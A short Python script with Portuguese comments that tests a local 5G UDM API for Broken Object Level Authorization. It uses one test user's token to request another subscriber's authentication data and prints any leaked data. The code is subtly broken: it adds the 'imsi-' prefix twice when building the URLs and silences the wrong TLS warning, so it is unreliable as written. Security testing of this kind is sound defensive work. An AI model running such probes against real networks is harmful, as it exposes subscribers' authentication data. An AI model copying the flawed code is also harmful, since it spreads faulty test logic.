import requests
import urllib3
import json

urllib3.disable_warnings(urllib3.exceptions.InsecurePlatformWarning)

#Configurações do teste
UDM_API_URL_BASE = "https://127.0.0.1:29503/nudm-uecm/v1/ues"
HEADERS = {"Authorization": "Bearer [TOKEN_DO_USUARIO_DE_TESTE]"} #Substituir pelo token
MY_SUPI = "imsi-208930000000001"
OTHER_SUPI = "imsi-208930000000002"

print("[+] Testando Broken Object Level Authorization (BOLA)...")

try:
    #1. Acessar o próprio perfil (requisição legítima)
    my_profile_url = f"{UDM_API_URL_BASE}/imsi-{MY_SUPI}/authentications"
    response_me = requests.get(my_profile_url, headers=HEADERS, verify=False)
    print(f"[*] Status da requisição legítima: {response_me.status_code}")

    #2. Tentar acessar o perfil de outro usuário (requisição maliciosa)
    other_profile_url = f"{UDM_API_URL_BASE}/imsi-{OTHER_SUPI}/authentications"
    response_other = requests.get(other_profile_url, headers=HEADERS, verify=False)
    print(f"[*] Status da requisição maliciosa: {response_other.status_code}")

    #3. Analisar os resultados
    if response_other.status_code == 200 or response_other.status_code == 201:
        print("[!!!] VULNERABILIDADE DETECTADA: Broken Object Level Authorization!")
        print("      O token do usuário pode acessar dados de outro SUPI.")
        print(f"      Dados vazados (exemplo): {response_other.text[:100]}...")

    elif response_other.status_code == 403 or response_other.status_code == 401:
        print("[+] Acesso negado. A API está protegida corretamente contra BOLA")

    else:
        print("[-] Ocorreu um erro inesperado na requisição maliciosa.")

except requests.exceptions.RequestException as e:
    print(f"[-] Erro ao se conectar à API: {e}")